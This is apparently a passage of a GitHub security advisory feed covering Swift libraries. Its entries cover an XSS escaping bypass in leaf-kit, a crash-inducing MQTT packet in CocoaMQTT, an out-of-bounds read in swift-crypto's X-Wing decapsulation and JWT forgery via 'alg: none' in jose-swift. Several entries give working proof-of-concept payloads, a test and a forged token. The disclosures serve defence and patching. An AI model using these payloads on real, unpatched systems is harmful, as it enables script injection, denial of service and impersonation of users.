<p>I believe replacingOccurences takes an optional third parameter that allows you to specify options to make it work on UTF-8 characters instead of grapheme clusters, which would be a good fix for this issue.</p>
<p>I see depending on version, leafkit might use <code>replacing</code> instead of <code>replacingOccurences</code>. I don't know swift that well and couldn't find docs on what replacing does, so I don't know if both versions of the function are affected. The version of swift i was testing on I believe was using replacingOccurences</p>
<p>It seems like replacingOccurences will skip past prefix characters of extended grapheme clusters, which is what would be needed in order to meaningfully bypass esaping of &lt;. Thus i think this is mostly limited to attributes and not general text.</p>
<h3 id="poc">PoC</h3>
<p>An example vapor application that is vulnerable might look like</p>
<p>routes.swift</p>
<pre><code class="language-swift">import Vapor

struct Hello: Content {
    var msg: String?
}

func routes(_ app: Application) throws {
    app.post { req throws in
    let Hello = try req.content.decode(Hello.self)
        return req.view.render("hello", [
            "msg": Hello.msg ?? "Hello World!"
        ])
    }
}
</code></pre>
<p>With a hello.leaf that looks like</p>
<pre><code>&lt;div title="#(msg)"&gt;Hover to see message&lt;/div&gt;
</code></pre>
<p>And then you POST something like <code>msg=%22%cc%81=1%20autofocus%20tabindex=0%20onfocus=alert(1)%20</code></p>
<h3 id="impact">Impact</h3>
<p>If a website uses leaf to escape an attribute value based on user input, the attacker may be able to insert a malicious attribute. If a site is not using a secure CSP policy, then this can be used to execute malicious javascript (XSS). Impact is context dependent if a site is using a secure CSP policy.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vapor/leaf-kit/security/advisories/GHSA-4hfh-fch3-5q7p">https://github.com/vapor/leaf-kit/security/advisories/GHSA-4hfh-fch3-5q7p</a></li>
<li><a href="https://github.com/vapor/leaf-kit/commit/8919e39476c3a4ba05c28b71546bb9195f87ef34">https://github.com/vapor/leaf-kit/commit/8919e39476c3a4ba05c28b71546bb9195f87ef34</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27120">https://nvd.nist.gov/vuln/detail/CVE-2026-27120</a></li>
<li><a href="https://github.com/advisories/GHSA-4hfh-fch3-5q7p">https://github.com/advisories/GHSA-4hfh-fch3-5q7p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4hfh-fch3-5q7p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-19T19:40:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[CocoaMQTT] CocoaMQTT: Denial of Service via Reachable Assertion in `PUBLISH` Packet Parsing ]]></title>
        <id>https://github.com/advisories/GHSA-r3fr-7m74-q7g2</id>
        <link href="https://github.com/advisories/GHSA-r3fr-7m74-q7g2"/>
        <updated>2026-04-03T21:33:59.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability exists in the packet parsing logic of CocoaMQTT that allows an attacker (or a compromised/malicious MQTT broker) to remotely crash the host iOS/macOS/tvOS application.</p>
<p>The vulnerability is located in <code>Source/FramePublish.swift</code> during the extraction of the Topic string from the incoming byte array.</p>
<p>When parsing the Variable Header of a <code>PUBLISH</code> frame, the library reads the first two bytes to determine the <code>topicLength</code>. It then adds this length to the current position (<code>pos</code>) and attempts to slice the byte array to extract the string:</p>
<pre><code class="language-swift">if let data = NSString(bytes: [UInt8](bytes[2...(pos-1)]), length: Int(len), encoding: String.Encoding.utf8.rawValue) {
    topic = data as String
}
</code></pre>
<p>If a packet is received where the Topic Length evaluates to <code>0</code> (e.g., <code>0x00 0x00</code>), the <code>len</code> variable becomes <code>0</code>, and <code>pos</code> evaluates to <code>2</code>.</p>
<p>The slicing logic dynamically calculates <code>bytes[2...(2-1)]</code>, which becomes <strong><code>bytes[2...1]</code></strong>. Swift's <code>ClosedRange</code> operator (<code>...</code>) requires the lower bound to be less than or equal to the upper bound. Because 2 is not less than 1, Swift detects an out-of-bounds access attempt and immediately triggers a runtime trap (<code>Fatal error: Range requires lowerBound &lt;= upperBound</code>), crashing the host application.</p>
<p>If an attacker publishes this 4-byte malformed payload to a shared topic with the <code>RETAIN</code> flag set to true, the MQTT broker will persist the payload. Any time a vulnerable client connects and subscribes to that topic, the broker will automatically push the malformed packet. The app will instantly crash in the background before the user can even interact with it. This effectively "bricks" the mobile application (a persistent DoS) until the retained message is manually wiped from the broker database.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/emqx/CocoaMQTT/security/advisories/GHSA-r3fr-7m74-q7g2">https://github.com/emqx/CocoaMQTT/security/advisories/GHSA-r3fr-7m74-q7g2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30867">https://nvd.nist.gov/vuln/detail/CVE-2026-30867</a></li>
<li><a href="https://github.com/emqx/CocoaMQTT/pull/659">https://github.com/emqx/CocoaMQTT/pull/659</a></li>
<li><a href="https://github.com/emqx/CocoaMQTT/commit/010bca6f61b97d726252f61641d331a2bf82b338">https://github.com/emqx/CocoaMQTT/commit/010bca6f61b97d726252f61641d331a2bf82b338</a></li>
<li><a href="https://github.com/emqx/CocoaMQTT/releases/tag/2.2.2">https://github.com/emqx/CocoaMQTT/releases/tag/2.2.2</a></li>
<li><a href="https://github.com/advisories/GHSA-r3fr-7m74-q7g2">https://github.com/advisories/GHSA-r3fr-7m74-q7g2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r3fr-7m74-q7g2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-03T21:33:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[swift-crypto] Swift Crypto: X-Wing HPKE Decapsulation Accepts Malformed Ciphertext Length]]></title>
        <id>https://github.com/advisories/GHSA-9m44-rr2w-ppp7</id>
        <link href="https://github.com/advisories/GHSA-9m44-rr2w-ppp7"/>
        <updated>2026-04-03T03:39:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The X-Wing decapsulation path accepts attacker-controlled encapsulated ciphertext bytes without enforcing the required fixed ciphertext length. The decapsulation call is forwarded into a C API, which expects a compile-time fixed-size ciphertext buffer of 1120 bytes. This creates an FFI memory-safety boundary issue when a shorter <code>Data</code> value is passed in, because the C code may read beyond the Swift buffer.</p>
<p>The issue is reachable through initialization of an <code>HPKE.Recipient</code>, which decapsulates the provided <code>encapsulatedKey</code> during construction. A malformed <code>encapsulatedKey</code> can therefore trigger undefined behavior instead of a safe length-validation error.</p>
<h3 id="details">Details</h3>
<p>The <code>decapsulate</code> function of <code>OpenSSLXWingPrivateKeyImpl</code>  does not perform a length check before passing the <code>encapsulated</code> data to the C API.</p>
<pre><code class="language-swift">func decapsulate(_ encapsulated: Data) throws -&gt; SymmetricKey {
    try SymmetricKey(unsafeUninitializedCapacity: Int(XWING_SHARED_SECRET_BYTES)) { sharedSecretBytes, count in
        try encapsulated.withUnsafeBytes { encapsulatedSecretBytes in
            let rc = CCryptoBoringSSL_XWING_decap(
                sharedSecretBytes.baseAddress,
                encapsulatedSecretBytes.baseAddress,
                &amp;self.privateKey
            )
            guard rc == 1 else {
                throw CryptoKitError.internalBoringSSLError()
            }
            count = Int(XWING_SHARED_SECRET_BYTES)
        }
    }
}
</code></pre>
<p>The C API does not have a runtime length parameter and instead expects a fixed-size buffer of 1120 bytes.</p>
<pre><code class="language-c">#define XWING_CIPHERTEXT_BYTES 1120

OPENSSL_EXPORT int XWING_decap(
    uint8_t out_shared_secret[XWING_SHARED_SECRET_BYTES],
    const uint8_t ciphertext[XWING_CIPHERTEXT_BYTES],
    const struct XWING_private_key *private_key);
</code></pre>
<p>Since <code>decapsulate</code> accepts arguments of any length, an attacker controlled input can trigger an out-of-bounds read. The vulnerable code path can be reached through by initializing a <code>HPKE.Recipient</code>. This creates a new <code>HPKE.Context</code>, which decapsulates the attacker-controlled <code>enc</code> argument:</p>
<pre><code class="language-swift">init&lt;PrivateKey: HPKEKEMPrivateKey&gt;(recipientRoleWithCiphersuite ciphersuite: Ciphersuite, mode: Mode, enc: Data, psk: SymmetricKey?, pskID: Data?, skR: PrivateKey, info: Data, pkS: PrivateKey.PublicKey?) throws {
    let sharedSecret = try skR.decapsulate(enc)
    self.encapsulated = enc
    self.keySchedule = try KeySchedule(mode: mode, sharedSecret: sharedSecret, info: info, psk: psk, pskID: pskID, ciphersuite: ciphersuite)
}
</code></pre>
<h3 id="poc">PoC</h3>
<p>This PoC constructs an <code>HPKE.Recipient</code> using the X-Wing ciphersuite and deliberately passes a 1-byte <code>encapsulatedKey</code> instead of the required 1120 bytes. In a normal run, the malformed input is accepted and it reaches the vulnerable decapsulation path, i.e., no size rejection occurs. In an AddressSanitizer run, the same PoC produces a <code>dynamic-stack-buffer-overflow</code> read, confirming memory-unsafe behavior.</p>
<pre><code class="language-swift">//===----------------------------------------------------------------------===//
//
// PoC for X-Wing malformed ciphertext-length decapsulation:
// X-Wing decapsulation accepts malformed ciphertext length and forwards it to C.
//
// This test is intentionally unsafe and is expected to crash (or trip ASan)
// on vulnerable builds when run.
//
//===----------------------------------------------------------------------===//

#if canImport(FoundationEssentials)
import FoundationEssentials
#else
import Foundation
#endif
import XCTest

#if CRYPTO_IN_SWIFTPM &amp;&amp; !CRYPTO_IN_SWIFTPM_FORCE_BUILD_API
// Skip tests that require @testable imports of CryptoKit.
#else
#if !CRYPTO_IN_SWIFTPM_FORCE_BUILD_API
@testable import CryptoKit
#else
@testable import Crypto
#endif

final class XWingMalformedEncapsulationPoCTests: XCTestCase {
    func testShortEncapsulatedKeyHPKERecipientInit() throws {
        if #available(iOS 19.0, macOS 16.0, watchOS 12.0, tvOS 19.0, macCatalyst 19.0, *) {
            let ciphersuite = HPKE.Ciphersuite.XWingMLKEM768X25519_SHA256_AES_GCM_256
            let skR = try XWingMLKEM768X25519.PrivateKey.generate()
            let malformedEncapsulatedKey = Data([0x00]) // should be 1120 bytes

            // Vulnerable path: HPKE.Recipient -&gt; skR.decapsulate(enc) -&gt; XWING_decap(...)
            _ = try HPKE.Recipient(
                privateKey: skR,
                ciphersuite: ciphersuite,
                info: Data(),
                encapsulatedKey: malformedEncapsulatedKey
            )

            XCTFail("Unexpectedly returned from malformed decapsulation path")
        }
    }
}

#endif // CRYPTO_IN_SWIFTPM
</code></pre>
<h4 id="steps">Steps</h4>
<ol>
<li>Add the PoC XCTest above to the test suite.</li>
<li>Run the PoC normally to verify that malformed input is not rejected by length:<pre><code class="language-bash">swift test --filter XWingMalformedEncapsulationPoCTests/testShortEncapsulatedKeyHPKERecipientInit
</code></pre>
</li>
<li>Run the same PoC with AddressSanitizer enabled to detect out-of-bounds memory access:<pre><code class="language-bash">swift test --sanitize=address --filter XWingMalformedEncapsulationPoCTests/testShortEncapsulatedKeyHPKERecipientInit
</code></pre>
</li>
</ol>
<h4 id="results">Results</h4>
<h5 id="normal-run">Normal run</h5>
<p>The PoC test reaches the <code>XCTFail</code> path. <code>HPKE.Recipient(...)</code> accepted a <code>1</code>-byte X-Wing encapsulated key instead of rejecting it for incorrect length.</p>
<pre><code class="language-text">Test Case 'XWingMalformedEncapsulationPoCTests.testShortEncapsulatedKeyHPKERecipientInit' started
... failed - Unexpectedly returned from malformed decapsulation path
</code></pre>
<h5 id="addresssanitizer-run">AddressSanitizer run</h5>
<p>The sanitizer run aborts with a read overflow while executing the same PoC path. This confirms the memory-safety violation. The malformed ciphertext reaches memory-unsafe behavior in the decapsulation chain.</p>
<pre><code class="language-text">ERROR: AddressSanitizer: dynamic-stack-buffer-overflow
READ of size 1
...
SUMMARY: AddressSanitizer: dynamic-stack-buffer-overflow
==...==ABORTING
</code></pre>
<h3 id="impact">Impact</h3>
<p>A remote attacker can supply a short X-Wing HPKE encapsulated key and trigger an out-of-bounds read in the C decapsulation path, potentially causing a crash or memory disclosure depending on runtime protections.</p>
<p>Reported by Cantina.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apple/swift-crypto/security/advisories/GHSA-9m44-rr2w-ppp7">https://github.com/apple/swift-crypto/security/advisories/GHSA-9m44-rr2w-ppp7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28815">https://nvd.nist.gov/vuln/detail/CVE-2026-28815</a></li>
<li><a href="https://github.com/advisories/GHSA-9m44-rr2w-ppp7">https://github.com/advisories/GHSA-9m44-rr2w-ppp7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9m44-rr2w-ppp7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T03:39:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/beatt83/jose-swift] jose-swift has JWT Signature Verification Bypass via None Algorithm]]></title>
        <id>https://github.com/advisories/GHSA-88q6-jcjg-hvmw</id>
        <link href="https://github.com/advisories/GHSA-88q6-jcjg-hvmw"/>
        <updated>2026-03-25T20:10:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An authentication bypass vulnerability allows any unauthenticated attacker to forge arbitrary JWT tokens by setting "alg": "none" in the token header. The library's verification functions immediately return <code>true</code> for such tokens without performing any cryptographic verification, enabling complete impersonation of any user and privilege escalation.</p>
<h3 id="details">Details</h3>
<p>  The vulnerability exists in Sources/JSONWebSignature/JWS+Verify.swift at lines 34-37:</p>
<pre><code>  public func verify&lt;Key&gt;(key: Key?) throws -&gt; Bool {
      guard SigningAlgorithm.none != protectedHeader.algorithm else {
          return true  // &lt;-- Vulnerability: returns true without verification
      }
</code></pre>
<p>  When the JWT header contains "alg": "none", the verify() method returns true immediately without:</p>
<ol>
<li>Checking if the signature is empty or present</li>
<li>Validating the token against any key</li>
<li>Requiring explicit opt-in from the caller</li>
</ol>
<p> The SigningAlgorithm enum in Sources/JSONWebAlgorithms/Signatures/SigningAlgorithm.swift:72 explicitly includes case none = "none" as a valid algorithm.</p>
<p>  All verification methods are affected:</p>
<ul>
<li>JWS.verify(key:) - Instance method</li>
<li>JWS.verify(jwsString:payload:key:) - Static method</li>
<li>JWT.verify(jwtString:senderKey:) - High-level API</li>
</ul>
<h3 id="poc">PoC</h3>
<ol>
<li>Create a forged JWT with modified claims:
  // Forged header with alg:none
  let header = #"{"alg":"none","typ":"JWT"}"#</li>
</ol>
<p>  // Attacker's payload with escalated privileges
  let payload = #"{"sub":"user123","admin":true}"#</p>
<p>  // Base64URL encode and concatenate with empty signature
  let forgedToken = base64url(header) + "." + base64url(payload) + "."
  // Result: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyMTIzIiwiYWRtaW4iOnRydWV9.</p>
<ol start="2">
<li>Verify the forged token passes verification:
  let jws = try JWS(jwsString: forgedToken)
  let isValid = try jws.verify(key: legitimateSecretKey)  // Returns TRUE</li>
</ol>
<h3 id="impact">Impact</h3>
<p>  This is an authentication bypass vulnerability.   Who is impacted: Any application using jose-swift for JWT verification is vulnerable. An attacker can:</p>
<ul>
<li>Forge identity: Create tokens claiming to be any user</li>
<li>Escalate privileges: Add admin/superuser claims to gain unauthorized access</li>
<li>Bypass authentication entirely: Access protected resources without valid credentials</li>
<li>Modify any claim: Change expiration, audience, issuer, or any custom claims</li>
</ul>
<p>  The attack requires no knowledge of the signing key and works against all signature algorithms (HS256, RS256, ES256, etc.) since the attacker simply bypasses signature verification entirely.</p>
<h3 id="credits">Credits</h3>
<p>Reported by Louis Nyffenegger - <a href="https://pentesterlab.com/">https://pentesterlab.com/</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/beatt83/jose-swift/security/advisories/GHSA-88q6-jcjg-hvmw">https://github.com/beatt83/jose-swift/security/advisories/GHSA-88q6-jcjg-hvmw</a></li>
<li><a href="https://github.com/beatt83/jose-swift/pull/62">https://github.com/beatt83/jose-swift/pull/62</a></li>
<li><a href="https://github.com/beatt83/jose-swift/commit/13e5ae6f23ef1487b0dad72540eff414272bd7ca">https://github.com/beatt83/jose-swift/commit/13e5ae6f23ef1487b0dad72540eff414272bd7ca</a></li>
<li><a href="https://github.com/beatt83/jose-swift/releases/tag/6.0.2">https://github.com/beatt83/jose-swift/releases/tag/6.0.2</a></li>
<li><a href="https://github.com/advisories/GHSA-88q6-jcjg-hvmw">https://github.com/advisories/GHSA-88q6-jcjg-hvmw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-88q6-jcjg-hvmw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-01-09T19:39:30.000Z</published>
    </entry>
</feed>